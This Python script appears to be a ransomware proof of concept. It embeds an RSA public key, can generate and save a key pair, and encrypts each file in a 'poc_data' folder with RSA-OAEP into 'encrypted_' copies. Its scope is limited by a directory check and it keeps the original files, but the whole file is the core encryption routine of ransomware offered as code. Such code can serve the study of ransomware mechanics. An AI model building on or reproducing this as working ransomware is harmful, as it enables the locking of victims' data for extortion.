import os
import sys

from pathlib import Path
from collections import namedtuple
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding


Keyring = namedtuple('Keyring', ['private', 'public'])

public_key_text = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApp3/ymv0wSE4YvrpbC71
G1ihwmTYNeQsDwgsGcJfFAIPNHWX6W7I+tYcjMupv+UJCAvinjvUTfVqvTknjS54
6I90MAQPJHu6K9XLwEBCD6Lsq0VSpvak1ZVJ/mnTyp0e7zCtj2E5/k2DaPrHcwjN
uFAfpiqjf6+NPDQbRUMd4LB1DwgcIyTRVAYSezexZlBa0EMDEUdnH6qlYRoirHhR
b1SbKpo6AskBZdqTR2GI04tAwm2zPFNu3b27Gy6nyoknYesV+Ug+iuW2q/7XmGEG
kFHYiXgf3S5+tJ30DJsl4vpE8HjsFU6yOpa+9B1/7wvufHqYSfN6LeWFDtpxo10g
vwIDAQAB
-----END PUBLIC KEY-----
"""


def main():
    if len(sys.argv) > 1 and sys.argv[1] == '-g':
        keys = generate_key_pair()
        store_keys(keys)

    public_key = load_public_key()
    encrypt_files(public_key)


def generate_key_pair() -> Keyring:
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()
    return Keyring(private_key, public_key)


def store_keys(keys: Keyring):
    private_pem = keys.private.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    public_pem = keys.public.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open('private_key.pem', 'wb') as file:
        file.write(private_pem)

    with open('public_key.pem', 'wb') as file:
        file.write(public_pem)


def load_public_key():
    public_key = serialization.load_pem_public_key(public_key_text, backend=default_backend())
    return public_key


def encrypt_files(public_key):
    # avoid catastrophy
    if not os.path.isdir('poc_data'):
        print('No proof of concept directory, exit')
        exit(1)

    files_to_encrypt = os.listdir('poc_data')

    for file in files_to_encrypt:
        # Very quick safeguard to ensure we do not reencrypt the same file
        if 'encrypted' in file or 'decrypted' in file:
            continue

        with open(Path(f'poc_data/{file}'), 'rb') as decrypted_file:
            encrypted_content = public_key.encrypt(
                decrypted_file.read(),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

        with open(Path(f'poc_data/encrypted_{file}'), 'wb') as encrypted_file:
            encrypted_file.write(encrypted_content)


if __name__ == '__main__':
    main()
